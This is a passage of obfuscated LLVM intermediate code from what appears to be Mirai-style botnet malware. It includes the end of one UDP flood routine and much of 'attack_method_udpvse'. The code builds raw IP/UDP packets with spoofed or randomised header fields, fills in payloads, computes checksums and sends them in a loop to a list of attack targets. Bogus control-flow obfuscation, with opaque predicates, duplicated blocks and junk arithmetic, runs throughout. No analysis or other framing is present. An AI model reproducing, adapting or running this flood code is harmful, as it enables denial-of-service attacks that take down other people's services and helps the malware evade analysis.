  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %343
  %352 = call i32 @rand_next()
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  %356 = load i32, i32* @x.33
  %357 = load i32, i32* @y.34
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %364

; <label>:364:                                    ; preds = %originalBBpart254, %339
  %365 = load i16, i16* %16, align 2
  %366 = zext i16 %365 to i32
  %367 = icmp eq i32 %366, 65535
  br i1 %367, label %368, label %373

; <label>:368:                                    ; preds = %364
  %369 = call i32 @rand_next()
  %370 = trunc i32 %369 to i16
  %371 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %372 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 2
  br label %373

; <label>:373:                                    ; preds = %368, %364
  %374 = load i16, i16* %17, align 2
  %375 = zext i16 %374 to i32
  %376 = icmp eq i32 %375, 65535
  br i1 %376, label %377, label %382

; <label>:377:                                    ; preds = %373
  %378 = call i32 @rand_next()
  %379 = trunc i32 %378 to i16
  %380 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %381 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  br label %382

; <label>:382:                                    ; preds = %377, %373
  %383 = load i8, i8* %19, align 1
  %384 = icmp ne i8 %383, 0
  br i1 %384, label %385, label %405

; <label>:385:                                    ; preds = %382
  %386 = load i32, i32* @x.33
  %387 = load i32, i32* @y.34
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %385
  %394 = load i8*, i8** %26, align 8
  %395 = load i16, i16* %18, align 2
  %396 = zext i16 %395 to i32
  call void @rand_str(i8* %394, i32 %396)
  %397 = load i32, i32* @x.33
  %398 = load i32, i32* @y.34
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %405

; <label>:405:                                    ; preds = %originalBBpart258, %382
  %406 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 7
  store i16 0, i16* %407, align 2
  %408 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %409 = bitcast %struct.iphdr* %408 to i16*
  %410 = call zeroext i16 @checksum_generic(i16* %409, i32 20)
  %411 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i32 0, i32 7
  store i16 %410, i16* %412, align 2
  %413 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %414 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %413, i32 0, i32 3
  store i16 0, i16* %414, align 2
  %415 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %416 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %417 = bitcast %struct.udphdr* %416 to i8*
  %418 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %419 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %418, i32 0, i32 2
  %420 = load i16, i16* %419, align 2
  %421 = load i16, i16* %18, align 2
  %422 = zext i16 %421 to i64
  %423 = add i64 8, %422
  %424 = trunc i64 %423 to i32
  %425 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %415, i8* %417, i16 zeroext %420, i32 %424)
  %426 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %427 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %426, i32 0, i32 3
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 1
  %430 = load i16, i16* %429, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 1
  store i16 %430, i16* %436, align 2
  %437 = load i32, i32* %10, align 4
  %438 = load i8*, i8** %23, align 8
  %439 = load i16, i16* %18, align 2
  %440 = zext i16 %439 to i64
  %441 = add i64 28, %440
  %442 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %443 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %444 = load i32, i32* %9, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = bitcast %struct.sockaddr_in* %447 to %struct.sockaddr*
  store %struct.sockaddr* %448, %struct.sockaddr** %442, align 8
  %449 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %450 = load %struct.sockaddr*, %struct.sockaddr** %449, align 8
  %451 = call i64 @sendto(i32 %437, i8* %438, i64 %441, i32 16384, %struct.sockaddr* %450, i32 16)
  br label %452

; <label>:452:                                    ; preds = %405
  %453 = load i32, i32* %9, align 4
  %454 = add nsw i32 %453, 1
  store i32 %454, i32* %9, align 4
  br label %252

; <label>:455:                                    ; preds = %252
  %456 = load i32, i32* @x.33
  %457 = load i32, i32* @y.34
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %455
  %464 = load i32, i32* @x.33
  %465 = load i32, i32* @y.34
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %251

; <label>:472:                                    ; preds = %113, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %72
  %473 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %473, i32* %10, align 4
  %474 = icmp eq i32 %473, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %91
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %116
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  %475 = load i32, i32* %9, align 4
  %476 = load i8, i8* %5, align 1
  %477 = zext i8 %476 to i32
  %478 = icmp slt i32 %475, %477
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %154
  %479 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %480 = load i8**, i8*** %11, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds i8*, i8** %480, i64 %482
  store i8* %479, i8** %483, align 8
  %484 = load i8**, i8*** %11, align 8
  %485 = load i32, i32* %9, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds i8*, i8** %484, i64 %486
  %488 = load i8*, i8** %487, align 8
  %489 = bitcast i8* %488 to %struct.iphdr*
  store %struct.iphdr* %489, %struct.iphdr** %21, align 8
  %490 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i64 1
  %492 = bitcast %struct.iphdr* %491 to %struct.udphdr*
  store %struct.udphdr* %492, %struct.udphdr** %22, align 8
  %493 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %494 = bitcast %struct.iphdr* %493 to i8*
  %495 = load i8, i8* %494, align 4
  %_ = sub i8 0, %495
  %gen = add i8 %_, 15
  %_15 = sub i8 0, %495
  %gen16 = add i8 %_15, 15
  %_17 = sub i8 0, %495
  %gen18 = add i8 %_17, 15
  %_19 = sub i8 %495, 15
  %gen20 = mul i8 %_19, 15
  %_21 = sub i8 %495, 15
  %gen22 = mul i8 %_21, 15
  %_23 = sub i8 %495, 15
  %gen24 = mul i8 %_23, 15
  %_25 = sub i8 0, %495
  %gen26 = add i8 %_25, 15
  %496 = and i8 %495, 15
  %_27 = sub i8 0, %496
  %gen28 = add i8 %_27, 64
  %_29 = sub i8 0, %496
  %gen30 = add i8 %_29, 64
  %497 = or i8 %496, 64
  store i8 %497, i8* %494, align 4
  %498 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %499 = bitcast %struct.iphdr* %498 to i8*
  %500 = load i8, i8* %499, align 4
  %_31 = sub i8 %500, -16
  %gen32 = mul i8 %_31, -16
  %_33 = sub i8 %500, -16
  %gen34 = mul i8 %_33, -16
  %_35 = shl i8 %500, -16
  %501 = and i8 %500, -16
  %_36 = shl i8 %501, 5
  %502 = or i8 %501, 5
  store i8 %502, i8* %499, align 4
  %503 = load i8, i8* %12, align 1
  %504 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 1
  store i8 %503, i8* %505, align 1
  %506 = load i16, i16* %18, align 2
  %507 = zext i16 %506 to i64
  %_37 = sub i64 28, %507
  %gen38 = mul i64 %_37, %507
  %_39 = sub i64 0, 28
  %gen40 = add i64 %_39, %507
  %508 = add i64 28, %507
  %509 = trunc i64 %508 to i16
  %510 = call zeroext i16 @htons(i16 zeroext %509) #7
  %511 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 2
  store i16 %510, i16* %512, align 2
  %513 = load i16, i16* %13, align 2
  %514 = call zeroext i16 @htons(i16 zeroext %513) #7
  %515 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %516 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %515, i32 0, i32 3
  store i16 %514, i16* %516, align 4
  %517 = load i8, i8* %14, align 1
  %518 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 5
  store i8 %517, i8* %519, align 4
  %520 = load i8, i8* %15, align 1
  %521 = icmp ne i8 %520, 0
  br label %originalBB14

originalBB44alteredBB:                            ; preds = %originalBB44, %257
  %522 = load i8**, i8*** %11, align 8
  %523 = load i32, i32* %9, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds i8*, i8** %522, i64 %524
  %526 = load i8*, i8** %525, align 8
  store i8* %526, i8** %23, align 8
  %527 = load i8*, i8** %23, align 8
  %528 = bitcast i8* %527 to %struct.iphdr*
  store %struct.iphdr* %528, %struct.iphdr** %24, align 8
  %529 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %530 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %529, i64 1
  %531 = bitcast %struct.iphdr* %530 to %struct.udphdr*
  store %struct.udphdr* %531, %struct.udphdr** %25, align 8
  %532 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %533 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %532, i64 1
  %534 = bitcast %struct.udphdr* %533 to i8*
  store i8* %534, i8** %26, align 8
  %535 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %536 = load i32, i32* %9, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i64 %537
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i32 0, i32 2
  %540 = load i8, i8* %539, align 4
  %541 = zext i8 %540 to i32
  %542 = icmp slt i32 %541, 32
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %316
  %543 = load i32, i32* %20, align 4
  %544 = icmp eq i32 %543, -1
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %343
  %545 = call i32 @rand_next()
  %546 = trunc i32 %545 to i16
  %547 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 3
  store i16 %546, i16* %548, align 4
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %385
  %549 = load i8*, i8** %26, align 8
  %550 = load i16, i16* %18, align 2
  %551 = zext i16 %550 to i32
  call void @rand_str(i8* %549, i32 %551)
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %455
  br label %originalBB60
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %75

; <label>:58:                                     ; preds = %4
  %59 = load i32, i32* @x.35
  %60 = load i32, i32* @y.36
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* @x.35
  %68 = load i32, i32* @y.36
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %400

; <label>:75:                                     ; preds = %4
  %76 = load i32, i32* @x.35
  %77 = load i32, i32* @y.36
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  store i32 1, i32* %9, align 4
  %84 = load i32, i32* %10, align 4
  %85 = bitcast i32* %9 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  %88 = load i32, i32* @x.35
  %89 = load i32, i32* @y.36
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %87, label %96, label %99

; <label>:96:                                     ; preds = %originalBBpart24
  %97 = load i32, i32* %10, align 4
  %98 = call i32 @close(i32 %97)
  br label %400

; <label>:99:                                     ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %100

; <label>:100:                                    ; preds = %192, %99
  %101 = load i32, i32* %9, align 4
  %102 = load i8, i8* %5, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  br i1 %104, label %105, label %195

; <label>:105:                                    ; preds = %100
  %106 = call noalias i8* @calloc(i64 128, i64 1) #6
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %20, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %21, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to i8*
  store i8* %122, i8** %22, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = load i8, i8* %124, align 4
  %126 = and i8 %125, 15
  %127 = or i8 %126, 64
  store i8 %127, i8* %124, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, -16
  %132 = or i8 %131, 5
  store i8 %132, i8* %129, align 4
  %133 = load i8, i8* %12, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i8 %133, i8* %135, align 1
  %136 = load i32, i32* %19, align 4
  %137 = sext i32 %136 to i64
  %138 = add i64 32, %137
  %139 = trunc i64 %138 to i16
  %140 = call zeroext i16 @htons(i16 zeroext %139) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 2
  store i16 %140, i16* %142, align 2
  %143 = load i16, i16* %13, align 2
  %144 = call zeroext i16 @htons(i16 zeroext %143) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 3
  store i16 %144, i16* %146, align 4
  %147 = load i8, i8* %14, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 5
  store i8 %147, i8* %149, align 4
  %150 = load i8, i8* %15, align 1
  %151 = icmp ne i8 %150, 0
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %105
  %153 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 4
  store i16 %153, i16* %155, align 2
  br label %156

; <label>:156:                                    ; preds = %152, %105
  %157 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 6
  store i8 17, i8* %158, align 1
  %159 = load i32, i32* @LOCAL_ADDR, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 8
  store i32 %159, i32* %161, align 4
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 9
  store i32 %167, i32* %169, align 4
  %170 = load i16, i16* %16, align 2
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %17, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 1
  store i16 %175, i16* %177, align 2
  %178 = load i32, i32* %19, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 12, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i8*, i8** %22, align 8
  %186 = bitcast i8* %185 to i32*
  store i32 -1, i32* %186, align 4
  %187 = load i8*, i8** %22, align 8
  %188 = getelementptr inbounds i8, i8* %187, i64 4
  store i8* %188, i8** %22, align 8
  %189 = load i8*, i8** %22, align 8
  %190 = load i8*, i8** %18, align 8
  %191 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %189, i8* %190, i32 %191)
  br label %192

; <label>:192:                                    ; preds = %156
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %9, align 4
  br label %100

; <label>:195:                                    ; preds = %100
  %196 = load i32, i32* @x.35
  %197 = load i32, i32* @y.36
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %195
  %204 = load i32, i32* @x.35
  %205 = load i32, i32* @y.36
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %212

; <label>:212:                                    ; preds = %399, %originalBBpart28
  %213 = load i32, i32* @x.35
  %214 = load i32, i32* @y.36
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %212
  store i32 0, i32* %9, align 4
  %221 = load i32, i32* @x.35
  %222 = load i32, i32* @y.36
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %229

; <label>:229:                                    ; preds = %396, %originalBBpart212
  %230 = load i32, i32* %9, align 4
  %231 = load i8, i8* %5, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp slt i32 %230, %232
  br i1 %233, label %234, label %399

; <label>:234:                                    ; preds = %229
  %235 = load i32, i32* @x.35
  %236 = load i32, i32* @y.36
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %234
  %243 = load i8**, i8*** %11, align 8
  %244 = load i32, i32* %9, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i8*, i8** %243, i64 %245
  %247 = load i8*, i8** %246, align 8
  store i8* %247, i8** %23, align 8
  %248 = load i8*, i8** %23, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  store %struct.iphdr* %249, %struct.iphdr** %24, align 8
  %250 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i64 1
  %252 = bitcast %struct.iphdr* %251 to %struct.udphdr*
  store %struct.udphdr* %252, %struct.udphdr** %25, align 8
  %253 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %254 = load i32, i32* %9, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i32 0, i32 2
  %258 = load i8, i8* %257, align 4
  %259 = zext i8 %258 to i32
  %260 = icmp slt i32 %259, 32
  %261 = load i32, i32* @x.35
  %262 = load i32, i32* @y.36
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %260, label %269, label %290

; <label>:269:                                    ; preds = %originalBBpart216
  %270 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 1
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = call i32 @rand_next()
  %278 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %279 = load i32, i32* %9, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i64 %280
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %281, i32 0, i32 2
  %283 = load i8, i8* %282, align 4
  %284 = zext i8 %283 to i32
  %285 = lshr i32 %277, %284
  %286 = add i32 %276, %285
